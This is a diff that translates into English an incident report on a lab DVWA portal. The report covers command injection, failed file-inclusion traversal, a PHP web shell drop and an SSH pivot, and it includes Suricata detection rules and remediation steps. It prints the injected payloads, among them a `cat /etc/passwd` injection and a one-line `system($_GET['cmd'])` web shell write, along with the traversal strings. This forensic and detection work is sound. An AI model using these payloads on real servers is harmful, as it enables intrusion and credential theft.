@@ -1,12 +1,12 @@
-# INC-2026-005 : OS Command Injection & LFI on NexaCorp Employee Portal
+# INC-2026-005: OS Command Injection & Web Shell Pivot on NexaCorp Employee Portal
 
 **Incident reference:** INC-2026-005
 **Client:** NexaCorp Industries
 **Affected system:** `bru-web-01` (employee self-service portal)
 **Reported by:** Marc Wauters, IT Infrastructure Manager
 **Date reported:** Monday June 8, 2026
-**Analyst:** Johan-Emmanuel Hatchi, SOC Analyst L1 : BeCode Corp
-**Classification:** Confidential : Do not distribute outside BeCode Corp
+**Analyst:** Johan-Emmanuel Hatchi, SOC Analyst L1, BeCode Corp
+**Classification:** Confidential, do not distribute outside BeCode Corp
 
 **Related incidents:** INC-2026-001, INC-2026-002, INC-2026-003 (Linux infrastructure), INC-2026-004 (SQL injection, same host `bru-web-01`)
 
@@ -14,36 +14,38 @@
 
 ## 1. Executive summary
 
-Le portail employe bru-web-01 a subi une intrusion reussie le vendredi 5 juin 2026, sur une fenetre de capture de 10 heures. Un attaquant externe (172.16.50.10) a exploite la page d'outils diagnostic (fonction "ping a device") pour executer des commandes systeme directement sur le serveur, une vulnerabilite dite d'injection de commande OS. L'attaquant a confirme l'execution de code sous le compte du serveur web (www-data), a recupere le contenu du fichier des comptes systeme (/etc/passwd) et a depose un programme cache (web shell) garantissant un acces repete au serveur.
+The employee portal `bru-web-01` was successfully breached on Friday June 5, 2026, over a capture window of roughly eight hours (08:00 to 15:47). An external attacker (172.16.50.10) abused the diagnostic tools page (a "ping a device" feature) to run system commands directly on the server, a vulnerability known as OS command injection. The attacker confirmed code execution under the web server account (www-data), read the contents of the system accounts file (/etc/passwd), and dropped a hidden program (a web shell) that guaranteed repeated access to the server.
 
-Une fonction voisine du portail (le lecteur de fichiers) a egalement ete sondee, mais ces tentatives ont toutes echoue : la fuite reelle de donnees est passee par l'injection de commande, pas par le lecteur de fichiers. Apres avoir pris le controle via le web shell, l'attaquant s'est connecte au serveur en SSH avec les identifiants valides d'un employe (j.martin), obtenant un acces interactif persistant.
+A neighbouring feature of the portal (the file viewer) was also probed, but those attempts all failed: the real data leak went through the command injection, not the file viewer. After taking control through the web shell, the attacker logged into the server over SSH using the valid credentials of an employee (j.martin), gaining persistent interactive access.
 
-La cause racine est un champ de saisie non filtre qui transmet directement les commandes a l'OS. Cinq regles de detection ont ete deployees pour identifier chaque etape de ce type d'attaque a l'avenir. Les actions correctives prioritaires figurent en Section 7.
+The root cause is an unfiltered input field that passes commands straight to the OS. Five detection rules were deployed to identify each stage of this type of attack in the future. Priority remediation actions are listed in Section 7.
 
 ---
 
 ## 2. Incident timeline
 
-*Note methodologique : tous les timestamps proviennent de web_access.log et auth.log (heure reelle de la requete). Les timestamps Wazuh refletent l'heure d'indexation SIEM et ne sont pas utilises pour la chronologie.*
+*Methodology note: all timestamps come from web_access.log and auth.log (real request time). Wazuh timestamps reflect SIEM indexing time and are not used for the timeline.*
 
 | Time (Jun 5, 2026) | Source IP | Event | Evidence |
 |---|---|---|---|
-| 08:00:02 | 172.16.50.10 | Authentification au portail (login.php, index.php) via curl | web_access.log |
-| 11:11:59 | 172.16.50.10 | **First malicious request** : premier POST sur le ping tool (command injection) | web_access.log |
-| 11:53:30 | 172.16.50.10 | POST exec : seconde commande | web_access.log |
-| 12:10:20 | 172.16.50.10 | POST exec : troisieme commande | web_access.log |
-| 12:47:59 | 172.16.50.10 | LFI baseline : `?page=include.php` (reponse 5510) | web_access.log |
-| 12:57:24 | 172.16.50.10 | LFI : `?page=../../../../etc/passwd` (reponse 3868 : echec) | web_access.log |
+| 08:00:02 | 172.16.50.10 | Portal authentication (login.php, index.php) via curl | web_access.log |
+| 11:11:59 | 172.16.50.10 | **First malicious request**: first POST to the ping tool (command injection) | web_access.log |
+| 11:53:30 | 172.16.50.10 | POST exec: second command | web_access.log |
+| 12:10:20 | 172.16.50.10 | POST exec: third command | web_access.log |
+| 12:47:59 | 172.16.50.10 | LFI baseline: `?page=include.php` (response 5510) | web_access.log |
+| 12:57:24 | 172.16.50.10 | LFI: `?page=../../../../etc/passwd` (response 3868, failed) | web_access.log |
 | 13:35:17 | 172.16.50.10 | POST exec | web_access.log |
-| 13:49:04 | 172.16.50.10 | LFI : `?page=../../../../etc/os-release` (3868 : echec) | web_access.log |
+| 13:49:04 | 172.16.50.10 | LFI: `?page=../../../../etc/os-release` (3868, failed) | web_access.log |
 | 14:15:47 | 172.16.50.10 | POST exec | web_access.log |
-| 14:25:00 | 172.16.50.10 | LFI : `?page=../../../../var/log/apache2/access.log` (3868 : echec) | web_access.log |
+| 14:25:00 | 172.16.50.10 | LFI: `?page=../../../../var/log/apache2/access.log` (3868, failed) | web_access.log |
 | 14:54:21 | 172.16.50.10 | POST exec | web_access.log |
-| 15:13:46 | 172.16.50.10 | LFI : `?page=../../../../var/www/html/dvwa/config/config.inc.php` (3868 : echec) | web_access.log |
-| 15:34:04 | 172.16.50.10 | POST exec : depot probable du web shell shell.php | web_access.log |
-| 15:35:40 | 172.16.50.10 | **Web shell usage** : `GET /shell.php?cmd=id` (RCE confirme) | web_access.log + pcap stream 3066 |
+| 15:13:46 | 172.16.50.10 | LFI: `?page=../../../../var/www/html/dvwa/config/config.inc.php` (3868, failed) | web_access.log |
+| 15:34:04 | 172.16.50.10 | POST exec: likely web shell drop (shell.php) | web_access.log |
+| 15:35:40 | 172.16.50.10 | **Web shell usage**: `GET /shell.php?cmd=id` (RCE confirmed) | web_access.log + pcap stream 3066 |
 | 15:37:23 | 172.16.50.10 | `GET /shell.php?cmd=ls -la /var/www/html/` | web_access.log + pcap stream 3076 |
-| 15:47:15 | 172.16.50.10 | **SSH Accepted password for j.martin** (pivot reussi, x3) | auth.log |
+| 15:47:15 | 172.16.50.10 | **SSH Accepted password for j.martin** (successful pivot, x3) | auth.log |
+
+The intrusion spans roughly eight hours, from the initial login at 08:00 to the SSH pivot at 15:47. The first offensive action, the command injection, lands at 11:11, after about three hours of access. That gap is itself a finding: the attacker held authenticated access well before exploiting it.
 
 ---
 
@@ -51,39 +53,39 @@ La cause racine est un champ de saisie non filtre qui transmet directement les c
 
 ### 3.1 Attack surface
 
-Le portail `bru-web-01` expose une section "diagnostic tools" comprenant :
-- un **ping tool** (envoie des paquets ICMP, affiche le resultat)
-- un **file viewer** (lit des documents systeme)
+The `bru-web-01` portal exposes a "diagnostic tools" section that includes:
+- a **ping tool** (sends ICMP packets, shows the result)
+- a **file viewer** (reads system documents)
 
-Les deux passent l'input utilisateur a l'OS sans assainissement. Vecteurs : **OS Command Injection** (ping tool) et **Local File Inclusion** (file viewer).
+Both pass user input to the OS without sanitisation. Vectors: **OS Command Injection** (ping tool) and **Local File Inclusion** (file viewer).
 
 ### 3.2 Attacker identification
 
 **Attacker IP:** `172.16.50.10`
 
-L'attaquant partage le subnet `172.16.50.0/24` avec les scanners internet de bruit de fond (`172.16.50.20-26`), ce qui empeche un filtrage par simple plage d'IP. La distinction se fait sur le **pattern de requetes** : la volumetrie de `172.16.50.10` (18 requetes) est meme la plus basse du subnet, mais ses requetes ciblent des endpoints precis et exploitables, la ou les scanners balancent du bruit generique non cible.
+The attacker shares the `172.16.50.0/24` subnet with background internet scanners (`172.16.50.20-26`), which rules out filtering by IP range alone. The distinction comes from the **request pattern**: the volume from `172.16.50.10` (18 requests) is in fact the lowest in the subnet, but its requests target precise, exploitable endpoints, where the scanners throw generic untargeted noise.
 
-Les 18 requetes de l'attaquant se repartissent sur trois zones, qui forment la kill chain complete :
+The attacker's 18 requests fall into three zones, which together form the full kill chain:
 
-| Requetes | Endpoint | Interpretation |
+| Requests | Endpoint | Interpretation |
 |---|---|---|
-| 7 POST | `/dvwa/vulnerabilities/exec/` | Ping tool : OS command injection |
-| 5 GET | `/dvwa/vulnerabilities/fi/?page=...` | File viewer : tentatives LFI |
-| 2 GET | `/shell.php?cmd=...` | Web shell depose : RCE confirme + persistance |
-| 4 GET | `/dvwa/login.php`, `/dvwa/index.php` | Acces authentifie au portail |
+| 7 POST | `/dvwa/vulnerabilities/exec/` | Ping tool: OS command injection |
+| 5 GET | `/dvwa/vulnerabilities/fi/?page=...` | File viewer: LFI attempts |
+| 2 GET | `/shell.php?cmd=...` | Dropped web shell: RCE confirmed and persistence |
+| 4 GET | `/dvwa/login.php`, `/dvwa/index.php` | Authenticated portal access |
 
 ### 3.3 Command injection (ping tool)
 
-**URL path :** `/dvwa/vulnerabilities/exec/` (methode POST)
+**URL path:** `/dvwa/vulnerabilities/exec/` (POST method)
 
-Sept requetes POST sur le ping tool entre 11:11:59 et 15:34:04. Le payload n'apparait pas dans l'access log (corps POST), mais deux elements confirment l'exploitation :
+Seven POST requests to the ping tool between 11:11:59 and 15:34:04. The payload does not appear in the access log (POST body), but two elements confirm exploitation:
 
-1. **Tailles de reponse anormales et variables** (5245, 5299, 5254, 6735, 5479, 5347, 5245) la ou un ping normal renverrait une taille stable. La variation indique que le serveur retourne la sortie de commandes differentes.
-2. **Le web shell depose** : apres le POST de 15:34:04, l'attaquant accede a `/shell.php?cmd=...`, un fichier inexistant dans DVWA standard. Le dernier POST exec a donc servi a ecrire ce shell sur le disque.
+1. **Abnormal and variable response sizes** (5245, 5299, 5254, 6735, 5479, 5347, 5245) where a normal ping would return a stable size. The variation shows that the server is returning the output of different commands.
+2. **The dropped web shell**: after the POST at 15:34:04, the attacker accesses `/shell.php?cmd=...`, a file that does not exist in standard DVWA. The final exec POST therefore served to write this shell to disk.
 
-**Running as who :** `www-data`
+**Running as who:** `www-data`
 
-Le follow stream du pcap (stream 3066) sur `GET /shell.php?cmd=id` donne la reponse serveur :
+The pcap follow stream (stream 3066) on `GET /shell.php?cmd=id` gives the server response:
 
 ```
 HTTP/1.1 200 OK
@@ -91,43 +93,43 @@ Server: Apache/2.4.67 (Debian)
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-L'attaquant execute des commandes OS sous le compte **`www-data`** (utilisateur Apache). RCE confirme. La seconde commande via le shell, `ls -la /var/www/html/` (stream 3076), enumere le webroot.
+The attacker runs OS commands under the **`www-data`** account (the Apache user). RCE confirmed. The second command through the shell, `ls -la /var/www/html/` (stream 3076), enumerates the webroot.
 
-**Commandes OS injectees (dans l'ordre, reconstruites par follow stream des 7 POST /exec/) :**
+**Injected OS commands (in order, reconstructed by follow stream of the 7 POST /exec/):**
 
-| Stream | Payload decode (corps POST) | Objectif |
+| Stream | Decoded payload (POST body) | Goal |
 |---|---|---|
-| 1269 | `ip=127.0.0.1` | Baseline benigne (ping legitime, validation du vecteur) |
-| 1572 | `ip=127.0.0.1;id` | Identite du process (`uid=33(www-data)`) |
-| 1683 | `ip=127.0.0.1;whoami` | Confirmation utilisateur |
-| 2251 | `ip=127.0.0.1;cat /etc/passwd` | **Lecture du fichier comptes systeme (fuite reelle)** |
-| 2522 | `ip=127.0.0.1;ls -la /var/www/html/` | Enumeration du webroot |
-| 2783 | `ip=127.0.0.1;uname -a` | Empreinte noyau / OS |
-| 3054 | `ip=127.0.0.1;echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php` | **Depot du web shell** |
+| 1269 | `ip=127.0.0.1` | Benign baseline (legitimate ping, vector validation) |
+| 1572 | `ip=127.0.0.1;id` | Process identity (`uid=33(www-data)`) |
+| 1683 | `ip=127.0.0.1;whoami` | User confirmation |
+| 2251 | `ip=127.0.0.1;cat /etc/passwd` | **Read of the system accounts file (real leak)** |
+| 2522 | `ip=127.0.0.1;ls -la /var/www/html/` | Webroot enumeration |
+| 2783 | `ip=127.0.0.1;uname -a` | Kernel and OS fingerprint |
+| 3054 | `ip=127.0.0.1;echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php` | **Web shell drop** |
 
-Le separateur `;` (URL-encode `%3B`) enchaine la commande injectee apres le `ip=127.0.0.1` legitime. Le payload du stream 2251 est la source confirmee de la fuite de `/etc/passwd` : la reponse serveur contient en clair la ligne `root:x:0:0:root:/root:/bin/bash` et l'integralite des comptes locaux, dont `j.martin:x:1001:1001`. Le stream 3054 est le POST qui ecrit le web shell sur le disque, precedant ses deux usages GET.
+The `;` separator (URL-encoded `%3B`) chains the injected command after the legitimate `ip=127.0.0.1`. The payload in stream 2251 is the confirmed source of the `/etc/passwd` leak: the server response contains, in clear text, the line `root:x:0:0:root:/root:/bin/bash` and the full set of local accounts, including `j.martin:x:1001:1001`. Stream 3054 is the POST that writes the web shell to disk, preceding its two GET uses.
 
-**Commandes confirmees via le web shell deploye :**
-1. `id` (stream 3066) : reponse `uid=33(www-data) gid=33(www-data) groups=33(www-data)`
+**Commands confirmed through the deployed web shell:**
+1. `id` (stream 3066): response `uid=33(www-data) gid=33(www-data) groups=33(www-data)`
 2. `ls -la /var/www/html/` (stream 3076)
 
-### 3.4 Local File Inclusion (file viewer) : le piege
+### 3.4 Local File Inclusion (file viewer): the trap
 
-**URL path + parametre :** `/dvwa/vulnerabilities/fi/?page=`
+**URL path and parameter:** `/dvwa/vulnerabilities/fi/?page=`
 
-Cinq requetes GET observees, chacune une seule fois :
+Five GET requests observed, each one once:
 
-| Page demandee | Type |
+| Page requested | Type |
 |---|---|
-| `include.php` | Baseline (fichier legitime du viewer) |
-| `../../../../etc/passwd` | Traversee : comptes systeme |
-| `../../../../etc/os-release` | Traversee : version OS |
-| `../../../../var/www/html/dvwa/config/config.inc.php` | Traversee : config DB DVWA |
-| `../../../../var/log/apache2/access.log` | Traversee : log Apache (tentative de log poisoning ?) |
+| `include.php` | Baseline (legitimate viewer file) |
+| `../../../../etc/passwd` | Traversal: system accounts |
+| `../../../../etc/os-release` | Traversal: OS version |
+| `../../../../var/www/html/dvwa/config/config.inc.php` | Traversal: DVWA DB config |
+| `../../../../var/log/apache2/access.log` | Traversal: Apache log (log poisoning attempt?) |
 
-**VERDICT : la LFI a ECHOUE.** Les tailles de reponse le prouvent :
+**VERDICT: the LFI FAILED.** The response sizes prove it:
 
-| Page demandee | Taille reponse |
+| Page requested | Response size |
 |---|---|
 | `include.php` (baseline) | 5510 |
 | `../../../../etc/passwd` | 3868 |
@@ -135,44 +137,44 @@ Cinq requetes GET observees, chacune une seule fois :
 | `../../../../var/log/apache2/access.log` | 3868 |
 | `../../../../var/www/html/dvwa/config/config.inc.php` | 3868 |
 
-Les quatre traversees renvoient exactement **3868 octets**, identique entre elles et different de la baseline (5510). Le file viewer a servi sa page d'erreur / par defaut a chaque tentative, sans jamais inclure le contenu du fichier demande. **Aucune donnee n'a fui par ce canal.** La fuite reelle de `/etc/passwd` (et autres informations systeme) provient de la command injection sur le ping tool, PAS du file viewer. C'est la distinction precise qu'exigent les questions 4 et 6.
+The four traversals all return exactly **3868 bytes**, identical to each other and different from the baseline (5510). The file viewer served its error / default page on every attempt, never including the requested file content. **No data left through this channel.** The real leak of `/etc/passwd` (and other system information) came from the command injection on the ping tool, NOT from the file viewer. This is the precise distinction required by questions 4 and 6.
 
 ### 3.5 What data was actually exposed
 
-**Canal de fuite : la command injection, exclusivement.**
+**Leak channel: the command injection, exclusively.**
 
-| Donnee | Canal | Statut |
+| Data | Channel | Status |
 |---|---|---|
-| `id` / identite www-data | Command injection (shell.php) | Expose |
-| Contenu du webroot (`ls /var/www/html/`) | Command injection (shell.php) | Expose |
-| `/etc/passwd`, `/etc/os-release`, config DVWA, log Apache | File viewer (LFI) | **NON expose** (LFI echouee, reponses 3868) |
+| `id` / www-data identity | Command injection (shell.php) | Exposed |
+| Webroot contents (`ls /var/www/html/`) | Command injection (shell.php) | Exposed |
+| `/etc/passwd`, `/etc/os-release`, DVWA config, Apache log | File viewer (LFI) | **Not exposed** (LFI failed, 3868 responses) |
 
-Point essentiel pour le rapport : le file viewer (LFI) a ete sollicite mais n'a **rien divulgue** (page par defaut a chaque fois, reponses identiques de 3868 octets). Toute l'information systeme reellement obtenue par l'attaquant est passee par la command injection et le web shell. Le compte `j.martin` reutilise en SSH apparait dans la sortie de `cat /etc/passwd` (stream 2251), confirmant que l'attaquant connaissait l'existence du compte avant le pivot. Le mot de passe lui-meme n'est pas visible dans /etc/passwd (champ `x`, hash deporte dans /etc/shadow), donc le credential a soit ete devine, soit obtenu par un autre moyen non visible dans le PCAP, soit etait deja connu de l'attaquant.
+Key point for the report: the file viewer (LFI) was probed but disclosed **nothing** (default page every time, identical 3868-byte responses). All the system information the attacker actually obtained went through the command injection and the web shell. The `j.martin` account reused over SSH appears in the output of `cat /etc/passwd` (stream 2251), confirming the attacker knew the account existed before the pivot. The password itself is not visible in /etc/passwd (the `x` field, hash held in /etc/shadow), so the credential was either guessed, obtained by some other means not visible in the PCAP, or already known to the attacker.
 
 ---
 
-## 4. Persistence & consequence
+## 4. Persistence and consequence
 
 ### 4.1 Persistence artifact
 
-**Persistence artifact :** `/shell.php`
+**Persistence artifact:** `/shell.php`
 
-L'access log montre deux requetes GET sur `/shell.php` avec un parametre `cmd` :
+The access log shows two GET requests to `/shell.php` with a `cmd` parameter:
 - `/shell.php?cmd=id`
-- `/shell.php?cmd=ls -la /var/www/html/` (encode : `ls+-la+%2Fvar%2Fwww%2Fhtml%2F`)
+- `/shell.php?cmd=ls -la /var/www/html/` (encoded: `ls+-la+%2Fvar%2Fwww%2Fhtml%2F`)
 
-`/shell.php` n'existe pas dans une installation DVWA standard : ce fichier a ete cree par l'attaquant. La presence d'un parametre `cmd` execute en GET confirme un **web shell fonctionnel**. C'est la preuve directe du RCE et de la persistance.
+`/shell.php` does not exist in a standard DVWA install: this file was created by the attacker. The presence of a `cmd` parameter executed over GET confirms a **working web shell**. This is direct proof of the RCE and of persistence.
 
-**POST qui a ecrit le shell (confirme) :** stream 3054, timestamp 13:34:04 (heure interne PCAP), corps :
+**POST that wrote the shell (confirmed):** stream 3054, timestamp 13:34:04 (internal PCAP time), body:
 `ip=127.0.0.1;echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php`
 
-Ce POST precede les deux usages GET du shell (15:35:40 et 15:37:23 dans l'access log). L'ordre deploiement (POST, command injection) puis usage (GET, /shell.php?cmd=) est la distinction exacte testee par les flags Phase 2 "web shell write" et "web shell usage". La reponse au premier usage (`?cmd=id`, stream 3066) contient bien la sortie de la commande (`uid=33(www-data)...`), confirmant que le shell execute du code et ne renvoie pas une page d'erreur.
+This POST precedes the two GET uses of the shell (15:35:40 and 15:37:23 in the access log). The ordering, deployment (POST, command injection) then usage (GET, /shell.php?cmd=), is the exact distinction tested by the Phase 2 flags "web shell write" and "web shell usage". The response to the first use (`?cmd=id`, stream 3066) does contain the command output (`uid=33(www-data)...`), confirming that the shell executes code and does not return an error page.
 
 ### 4.2 Pivot account
 
-**Pivot account :** `j.martin`
+**Pivot account:** `j.martin`
 
-auth.log montre une connexion SSH **reussie** depuis l'IP attaquant :
+auth.log shows a **successful** SSH login from the attacker IP:
 
 ```
 2026-06-05T15:47:15 bru-web-01 sshd[13158]: Accepted password for j.martin from 172.16.50.10 port 44061 ssh2
@@ -180,19 +182,19 @@ auth.log montre une connexion SSH **reussie** depuis l'IP attaquant :
 2026-06-05T15:47:20 bru-web-01 sshd[13195]: Accepted password for j.martin from 172.16.50.10 port 60839 ssh2
 ```
 
-Points cles :
-- **Accepted**, pas Failed : l'attaquant detient un credential SSH valide pour `j.martin`.
-- Source `172.16.50.10` : meme IP que toute l'activite web, correlation directe.
-- Timing : 15:47, soit ~10 minutes apres l'usage du web shell (15:37). Le mot de passe a probablement ete recupere via la command injection (lecture d'un fichier de config ou de credentials), pas via la LFI qui a echoue.
-- Trois connexions courtes successives (Accepted puis disconnect immediat), coherentes avec un test de validite du credential ou une automatisation.
+Key points:
+- **Accepted**, not Failed: the attacker holds a valid SSH credential for `j.martin`.
+- Source `172.16.50.10`: same IP as all the web activity, direct correlation.
+- Timing: 15:47, about 10 minutes after the web shell use (15:37). The password was likely obtained through the command injection (reading a config or credentials file), not through the LFI, which failed.
+- Three short successive logins (Accepted then immediate disconnect), consistent with a credential validity test or automation.
 
-Cet acces SSH authentifie sur `bru-web-01` est la consequence majeure de l'incident et le point de depart du Lab 6 : l'attaquant dispose desormais d'un foothold interactif persistant, independant du web shell.
+This authenticated SSH access on `bru-web-01` is the main consequence of the incident and the starting point for Lab 6: the attacker now holds a persistent interactive foothold, independent of the web shell.
 
 ---
 
 ## 5. Indicators of Compromise (IOC)
 
-Indicateurs de compromission consolides depuis web_access.log, auth.log et l'analyse PCAP :
+Indicators consolidated from web_access.log, auth.log and the PCAP analysis:
 
 | Type | Value |
 |---|---|
@@ -200,22 +202,22 @@ Indicateurs de compromission consolides depuis web_access.log, auth.log et l'ana
 | Command injection endpoint | `/dvwa/vulnerabilities/exec/` (POST) |
 | LFI endpoint | `/dvwa/vulnerabilities/fi/?page=` (GET) |
 | Web shell endpoint | `/shell.php?cmd=` (GET) |
-| Payload pattern (cmd injection) | POST vers `/exec/` ; web shell `/shell.php?cmd=` ; commandes `id`, `ls` |
-| Payload pattern (LFI) | `?page=../../../../etc/passwd` (et os-release, config.inc.php, access.log) |
+| Payload pattern (cmd injection) | POST to `/exec/`; web shell `/shell.php?cmd=`; commands `id`, `ls` |
+| Payload pattern (LFI) | `?page=../../../../etc/passwd` (and os-release, config.inc.php, access.log) |
 | Persistence artifact | `/shell.php` |
-| Pivot account | `j.martin` (SSH Accepted depuis 172.16.50.10 a 15:47) |
+| Pivot account | `j.martin` (SSH Accepted from 172.16.50.10 at 15:47) |
 
 ---
 
 ## 6. Detection recommendations (Suricata)
 
-Cinq regles ont ete developpees, une par etape distincte de la kill chain, et validees contre le PCAP en mode offline (`suricata -r`, reassemblage TCP deterministe). Chaque regle cible un buffer Suricata adapte a son intention :
+Five rules were developed, one per distinct stage of the kill chain, and validated against the PCAP in offline mode (`suricata -r`, deterministic TCP reassembly). Each rule targets a Suricata buffer matched to its intent:
 
-- `http.request_body` (corps brut, URL-encode) pour les payloads d'injection cote requete
-- `http.uri` (normalise) pour l'usage du web shell
-- `file_data` (corps de la reponse) pour la detection cote reponse, qui prouve l'exploitation reussie et non la simple tentative
+- `http.request_body` (raw, URL-encoded) for the request-side injection payloads
+- `http.uri` (normalised) for web shell usage
+- `file_data` (response body) for response-side detection, which proves successful exploitation rather than a mere attempt
 
-**Ruleset (fichier `/etc/suricata/rules/learner/lab.rules`, SID range analyste 1000001-1000005) :**
+**Ruleset (file `/etc/suricata/rules/learner/lab.rules`, analyst SID range 1000001-1000005):**
 
 ```
 alert http any any -> any any (msg:"LAB05 sensitive file targeting in command injection body"; flow:established,to_server; http.request_body; content:"etc"; nocase; sid:1000001; rev:4;)
@@ -225,20 +227,20 @@ alert http any any -> any any (msg:"LAB05 RCE confirmed www-data in response"; f
 alert http any any -> any any (msg:"LAB05 data exfil etc-passwd content in response"; flow:established,to_client; file_data; content:"root:x:0:0"; sid:1000005; rev:6;)
 ```
 
-**Logique par regle :**
+**Per-rule logic:**
 
-| SID | Etape detectee | Buffer | Match | Alertes (offline) |
+| SID | Stage detected | Buffer | Match | Alerts (offline) |
 |---|---|---|---|---|
-| 1000001 | Ciblage de fichier systeme dans l'injection | `http.request_body` | `etc` dans le corps POST | 1 |
-| 1000002 | Usage du web shell | `http.uri` | `shell.php` + `cmd=` | 2 |
-| 1000003 | Ecriture du web shell | `http.request_body` | `shell.php` dans le corps POST | 1 |
-| 1000004 | RCE confirmee cote reponse | `file_data` | `www-data` dans la reponse | 6 |
-| 1000005 | Exfiltration de /etc/passwd cote reponse | `file_data` | `root:x:0:0` dans la reponse | 1 |
+| 1000001 | System file targeting in the injection | `http.request_body` | `etc` in the POST body | 1 |
+| 1000002 | Web shell usage | `http.uri` | `shell.php` + `cmd=` | 2 |
+| 1000003 | Web shell write | `http.request_body` | `shell.php` in the POST body | 1 |
+| 1000004 | RCE confirmed, response side | `file_data` | `www-data` in the response | 6 |
+| 1000005 | /etc/passwd exfiltration, response side | `file_data` | `root:x:0:0` in the response | 1 |
 
-**Proof (extrait fast.log, replay offline du PCAP) :**
+**Proof (fast.log extract, offline PCAP replay):**
 
 ```
-=== PAR SID ===
+=== BY SID ===
       1 [1:1000001:4]
       2 [1:1000002:1]
       1 [1:1000003:1]
@@ -246,21 +248,21 @@ alert http any any -> any any (msg:"LAB05 data exfil etc-passwd content in respo
       1 [1:1000005:6]
 ```
 
-Les cinq regles declenchent. Le decompte offline est deterministe (Suricata lit le PCAP en `-r`, reassemblage complet sans contrainte de timing reseau), contrairement au live replay (`tcpreplay`) qui, sur cette infrastructure (interface MTU 1450, replay topspeed), perd le reassemblage des grosses reponses multi-segments et donne des comptes instables d'un run a l'autre. Pour un rapport forensique, le decompte offline est la reference fiable.
+All five rules fire. The offline count is deterministic (Suricata reads the PCAP in `-r`, full reassembly without network timing constraints), unlike the live replay (`tcpreplay`) which, on this infrastructure (MTU 1450 interface, topspeed replay), loses reassembly of large multi-segment responses and gives counts that are unstable from run to run. For a forensic report, the offline count is the reliable reference.
 
-**Note methodologique (ecart de comptage) :** la regle 1000002 (usage du web shell) produit 2 alertes en offline, une par requete shell reelle (`?cmd=id` et `?cmd=ls`, les seules requetes vers `shell.php` dans tout le PCAP, confirme via tshark). La plateforme CTF a valide ce flag a 4, ecart attribuable a des retransmissions TCP lors de son live replay. Le decompte forensiquement exact est **2**.
+**Methodology note (count discrepancy):** rule 1000002 (web shell usage) produces 2 alerts offline, one per real shell request (`?cmd=id` and `?cmd=ls`, the only requests to `shell.php` in the whole PCAP, confirmed via tshark). The CTF platform scored this flag at 4, a difference attributable to TCP retransmissions during its live replay. The forensically exact count is **2**.
 
-**Analyse des faux positifs :**
+**False positive analysis:**
 
-| SID | Risque FP | Mitigation production |
+| SID | FP risk | Production mitigation |
 |---|---|---|
-| 1000001 | `content:"etc"` est large : un corps POST legitime contenant le mot "etc" (abreviation, champ texte libre) declencherait. Risque nul ici (aucun trafic portail normal ne contient "etc"), mais a affiner en production. | Remplacer par `%2Fetc%2F` ou exiger le contexte de chemin (`;` separateur + `/etc/`) pour ne matcher qu'un chemin systeme injecte. |
-| 1000002 | Faible. La combinaison `shell.php` + `cmd=` dans l'URI est tres specifique d'un web shell. | Restreindre a la methode GET et au chemin exact `/shell.php` une fois le webroot connu. |
-| 1000003 | Faible. `shell.php` dans un corps POST est anormal. | Combiner avec la detection du separateur d'injection (`%3B`) pour reduire encore. |
-| 1000004 | `content:"www-data"` matche toute reponse contenant cette chaine, y compris des pages DVWA affichant le contexte utilisateur. Sur ce PCAP, 6 reponses matchent (sorties de commandes ET pages de contexte). En production, du contenu legitime pourrait mentionner www-data. | Combiner avec `content:"uid="` (sortie de `id`) pour ne matcher que la preuve d'execution stricte, ce qui ramene le compte aux 2 reponses contenant `uid=33(www-data)`. Compromis sensibilite / specificite a arbitrer selon le contexte. |
-| 1000005 | Tres faible. `root:x:0:0` dans une reponse HTTP signifie qu'un fichier /etc/passwd a fui dans le corps : il n'existe aucun cas legitime ou cette chaine apparait dans une reponse web normale. Excellente regle, FP quasi nul. | Aucune, regle exploitable telle quelle. |
+| 1000001 | `content:"etc"` is broad: a legitimate POST body containing the word "etc" (an abbreviation, a free-text field) would fire. Risk is nil here (no normal portal traffic contains "etc"), but to be tightened in production. | Replace with `%2Fetc%2F` or require the path context (`;` separator + `/etc/`) so it only matches an injected system path. |
+| 1000002 | Low. The `shell.php` + `cmd=` combination in the URI is highly specific to a web shell. | Restrict to the GET method and the exact `/shell.php` path once the webroot is known. |
+| 1000003 | Low. `shell.php` in a POST body is abnormal. | Combine with detection of the injection separator (`%3B`) to reduce further. |
+| 1000004 | `content:"www-data"` matches any response containing that string, including DVWA pages that display the user context. On this PCAP, 6 responses match (command outputs AND context pages). In production, legitimate content could mention www-data. | Combine with `content:"uid="` (the output of `id`) to match only strict proof of execution, which brings the count down to the 2 responses containing `uid=33(www-data)`. A sensitivity / specificity trade-off to set by context. |
+| 1000005 | Very low. `root:x:0:0` in an HTTP response means a /etc/passwd file leaked in the body: there is no legitimate case where this string appears in a normal web response. Excellent rule, near-zero FP. | None, the rule is usable as is. |
 
-**Workflow de validation utilise :**
+**Validation workflow used:**
 ```
 sudo suricata -c /etc/suricata/suricata.yaml -r attack.pcap -l ~/suri-offline \
   -S /etc/suricata/rules/learner/lab.rules --runmode single
@@ -271,47 +273,19 @@ grep -oE '\[1:[0-9]+:[0-9]+\]' ~/suri-offline/fast.log | sort | uniq -c
 
 ## 7. Remediation recommendations
 
-Cinq actions prioritaires, par ordre d'urgence :
+Five priority actions, in order of urgency:
 
-1. **Containment immediat.** Supprimer le web shell `/var/www/html/shell.php` du serveur. Lancer un scan d'integrite complet du webroot (`/var/www/html/`) pour detecter tout autre fichier depose. Bloquer l'IP `172.16.50.10` au perimetre (firewall / WAF).
+1. **Immediate containment.** Remove the web shell `/var/www/html/shell.php` from the server. Run a full integrity scan of the webroot (`/var/www/html/`) to detect any other dropped file. Block IP `172.16.50.10` at the perimeter (firewall / WAF).
 
-2. **Rotation du credential compromis.** Forcer le changement du mot de passe de `j.martin` et auditer toutes les sessions SSH depuis `172.16.50.10` (auth.log, last, journaux systeme). Verifier qu'aucune cle SSH ou tache cron n'a ete ajoutee sous ce compte.
+2. **Rotate the compromised credential.** Force a password change for `j.martin` and audit all SSH sessions from `172.16.50.10` (auth.log, last, system journals). Verify that no SSH key or cron job was added under this account.
 
-3. **Correction de la cause racine.** La page diagnostic (ping tool et file viewer) passe l'input utilisateur directement a l'OS via `system()`. Soit retirer ces fonctions si elles ne sont pas metier-critiques, soit les reecrire pour ne jamais passer d'entree utilisateur a un shell : utiliser des bibliotheques natives (ping applicatif, lecture de fichier en allowlist stricte) et valider l'entree contre une liste blanche, sans aucun metacaractere shell autorise.
